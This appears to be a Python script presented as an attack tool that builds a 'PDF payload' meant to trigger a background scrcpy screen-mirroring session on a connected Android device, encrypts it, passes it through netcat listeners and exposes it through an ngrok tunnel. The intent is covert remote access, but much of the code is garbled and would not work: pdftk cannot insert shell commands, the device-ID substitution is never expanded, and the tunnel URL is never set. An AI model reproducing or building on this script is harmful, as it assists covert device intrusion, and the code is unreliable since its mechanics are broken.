import subprocess
import tempfile
import webbrowser

# Variables
NGROK_TUNNEL_URL = None
COMMAND_FILE = "/tmp/command.txt"
FRAGMENTED_PDF_PAYLOAD = "/tmp/fragmented_pdf_payload"

# Functions
def generate_pdf_payload(pdf_file_1, pdf_file_2, pdf_payload):
  """Combines the two PDF files into one and adds the scrcpy command."""

  subprocess.run(["pdftk", pdf_file_1, pdf_file_2, "output", pdf_payload])
  subprocess.run(["pdftk", pdf_payload, "insert", "scrcpy -d $(get_device_id) --background --auto-connect yes", "output", pdf_payload])

def encrypt_pdf_payload(pdf_payload):
  """Encrypts the PDF payload with the given secret key."""

  subprocess.run(["openssl", "aes-256-cbc", "-e", "-k", "YOUR_SECRET_KEY", "-in", pdf_payload, "-out", pdf_payload + ".enc"])

def fragment_pdf_payload(pdf_payload):
  """Fragments the PDF payload and saves it to a temporary file."""

  fragmented_pdf_payload = tempfile.NamedTemporaryFile()
  subprocess.run(["nc", "-l", "localhost", "8080"], stdin=subprocess.Popen(["cat", pdf_payload], stdout=subprocess.PIPE))
  subprocess.run(["nc", "-l", "-u", "8080"], stdout=fragmented_pdf_payload)
  return fragmented_pdf_payload.name

def start_ngrok():
  """Starts the ngrok tunnel on port 8080."""

  subprocess.run(["ngrok", "start", "8080"])

def get_device_id():
  """Returns the ID of the connected Android device."""

  device_id = subprocess.check_output(["adb", "devices"], text=True).split("\t")[5]
  return device_id

# Main script
# Set the script to exit on the first error
set_exit_on_error = True

# Start the VPN
# Replace the following line with the command to start your VPN client
# subprocess.run(["openvpn", "YOUR_VPN_CONFIG_FILE"])

start_ngrok()

# Check if an Android device is connected
if not subprocess.check_output(["adb", "devices"], text=True).find("device") >= 0:
  print("No Android device is connected. Please connect an Android device before running this script.")
  exit(1)

# Get the two PDF files to combine
pdf_file_1 = "/path/to/pdf_file_1.pdf"
pdf_file_2 = "/path/to/pdf_file_2.pdf"

# Generate the PDF payload
pdf_payload = tempfile.NamedTemporaryFile()
generate_pdf_payload(pdf_file_1, pdf_file_2, pdf_payload.name)

# Encrypt the PDF payload
encrypt_pdf_payload(pdf_payload.name)

# Fragment the PDF payload
fragmented_pdf_payload = fragment_pdf_payload(pdf_payload.name)

# Open the PDF file automatically in the background
webbrowser.open(fragmented_pdf_payload)

# Print the ngrok tunnel URL
print("Your ngrok tunnel is", NGROK_TUNNEL_URL)
